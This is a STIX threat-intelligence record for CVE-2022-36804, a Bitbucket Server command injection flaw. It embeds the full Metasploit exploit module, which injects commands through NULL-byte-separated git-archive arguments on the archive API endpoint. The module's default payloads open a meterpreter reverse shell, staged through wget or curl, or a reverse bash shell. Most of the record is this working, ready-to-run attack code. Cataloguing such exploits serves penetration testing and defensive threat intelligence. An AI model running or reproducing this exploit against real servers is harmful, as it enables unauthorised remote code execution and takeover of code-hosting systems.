{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d1c63c0-24d4-4c17-9c97-e97b8e96526f",
    "created": "2024-08-14T17:02:37.184318Z",
    "modified": "2024-08-14T17:02:37.184322Z",
    "name": "Bitbucket Git Command Injection",
    "description": " Various versions of Bitbucket Server and Data Center are vulnerable to an unauthenticated command injection vulnerability in multiple API endpoints.  The `/rest/api/latest/projects/{projectKey}/repos/{repositorySlug}/archive` endpoint creates an archive of the repository, leveraging the `git-archive` command to do so. Supplying NULL bytes to the request enables the passing of additional arguments to the command, ultimately enabling execution of arbitrary commands.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/bitbucket_git_cmd_injection.rb",
            "external_id": "bitbucket_git_cmd_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/iJIxJ6JUow/cve-2022-36804/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/09/20/cve-2022-36804-easily-exploitable-vulnerability-in-atlassian-bitbucket-server-and-data-center/"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-36804"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bitbucket Git Command Injection',\n        'Description' => %q{\n          Various versions of Bitbucket Server and Data Center are vulnerable to\n          an unauthenticated command injection vulnerability in multiple API endpoints.\n\n          The `/rest/api/latest/projects/{projectKey}/repos/{repositorySlug}/archive` endpoint\n          creates an archive of the repository, leveraging the `git-archive` command to do so.\n          Supplying NULL bytes to the request enables the passing of additional arguments to the\n          command, ultimately enabling execution of arbitrary commands.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'TheGrandPew', # discovery\n          'Ron Bowes', # analysis and PoC\n          'Jang', # testanull - PoC\n          'Shelby Pace' # Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/' ],\n          [ 'URL', 'https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html' ],\n          [ 'URL', 'https://attackerkb.com/topics/iJIxJ6JUow/cve-2022-36804/rapid7-analysis' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2022/09/20/cve-2022-36804-easily-exploitable-vulnerability-in-atlassian-bitbucket-server-and-data-center/' ],\n          [ 'CVE', '2022-36804' ]\n        ],\n        'Platform' => [ 'linux' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Type' => :linux_dropper,\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' => %w[wget curl bourne],\n              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Type' => :unix_cmd,\n              'Arch' => ARCH_CMD,\n              'Payload' => { 'BadChars' => %(:/?#[]@) },\n              'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_bash' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-08-24',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(7990),\n        OptString.new('TARGETURI', [ true, 'The base URI of Bitbucket application', '/']),\n        OptString.new('USERNAME', [ false, 'The username to authenticate with', '' ]),\n        OptString.new('PASSWORD', [ false, 'The password to authenticate with', '' ])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'login')\n    )\n\n    return CheckCode::Unknown('Failed to receive response from application') unless res\n\n    unless res.body.include?('Bitbucket')\n      return CheckCode::Safe('Target does not appear to be Bitbucket')\n    end\n\n    footer = res.get_html_document&.at('footer')\n    return CheckCode::Detected('Cannot determine version of Bitbucket') unless footer\n\n    version_str = footer.at('span')&.children&.text\n    return CheckCode::Detected('Cannot find version string in footer') unless version_str\n\n    matches = version_str.match(/v(\\d+\\.\\d+\\.\\d+)/)\n    return CheckCode::Detected('Version unknown') unless matches && matches.length > 1\n\n    version_str = matches[1]\n    vprint_status(\"Found Bitbucket version: #{matches[1]}\")\n\n    num_vers = Rex::Version.new(version_str)\n    return CheckCode::NotVulnerable if num_vers <= Rex::Version.new('6.10.17')\n\n    major, minor, revision = version_str.split('.')\n    case major\n    when '6'\n      return CheckCode::Appears\n    when '7'\n      case minor\n      when '6'\n        return CheckCode::Appears if revision.to_i < 17\n      when '17'\n        return CheckCode::Appears if revision.to_i < 10\n      when '21'\n        return CheckCode::Appears if revision.to_i < 4\n      end\n    when '8'\n      case minor\n      when '0', '1'\n        return CheckCode::Appears if revision.to_i < 3\n      when '2'\n        return CheckCode::Appears if revision.to_i < 2\n      when '3'\n        return CheckCode::Appears if revision.to_i < 1\n      end\n    end\n\n    CheckCode::Detected\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def authenticate\n    print_status(\"Attempting to authenticate with user '#{username}' and password '#{password}'\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login'),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to reach login page') unless res&.body&.include?('login')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),\n      'keep_cookies' => true,\n      'vars_post' =>\n      {\n        'j_username' => username,\n        'j_password' => password,\n        'submit' => 'Log in'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve a response from log in attempt') unless res\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'dashboard'),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to receive a response from the dashboard') unless res\n\n    unless res.body.include?('Your work') && res.body.include?('Projects')\n      fail_with(Failure::BadConfig, 'Login failed...Credentials may be invalid')\n    end\n\n    @authenticated = true\n    print_good('Successfully logged into Bitbucket!')\n  end\n\n  def find_public_repo\n    print_status('Searching Bitbucket for publicly accessible repository')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'rest/api/latest/repos'),\n      'keep_cookies' => true\n    )\n\n    fail_with(Failure::Disconnected, 'Did not receive a response') unless res\n    json_data = JSON.parse(res.body)\n    fail_with(Failure::UnexpectedReply, 'Response had no JSON') unless json_data\n\n    unless json_data['size'] > 0\n      fail_with(Failure::NotFound, 'Bitbucket instance has no publicly available repositories')\n    end\n\n    # opt for public repos unless none exist.\n    # Attempt to use a private repo if so\n    repos = json_data['values']\n    possible_repos = repos.select { |repo| repo['public'] == true }\n    if possible_repos.empty? && @authenticated\n      possible_repos = repos.select { |repo| repo['public'] == false }\n    end\n\n    fail_with(Failure::NotFound, 'There doesn\\'t appear to be any repos to use') if possible_repos.empty?\n    possible_repos.each do |repo|\n      project = repo['project']\n      next unless project\n\n      @project = project['key']\n      @repo = repo['slug']\n      break if @project && @repo\n    end\n\n    fail_with(Failure::NotFound, 'Failed to find a repo to use for exploit') unless @project && @repo\n    print_good(\"Found public repo '#{@repo}' in project '#{@project}'!\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    uri = normalize_uri(target_uri.path, 'rest/api/latest/projects', @project, 'repos', @repo, 'archive')\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => uri,\n      'keep_cookies' => true,\n      'vars_get' =>\n      {\n        'format' => 'zip',\n        'path' => Rex::Text.rand_text_alpha(2..5),\n        'prefix' => \"#{Rex::Text.rand_text_alpha(1..3)}\\x00--exec=`#{cmd}`\\x00--remote=#{Rex::Text.rand_text_alpha(3..8)}\"\n      }\n    )\n  end\n\n  def exploit\n    @authenticated = false\n    authenticate unless username.blank? && password.blank?\n    find_public_repo\n\n    if target['Type'] == :linux_dropper\n      execute_cmdstager(linemax: 6000)\n    else\n      execute_command(payload.encoded)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-08-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}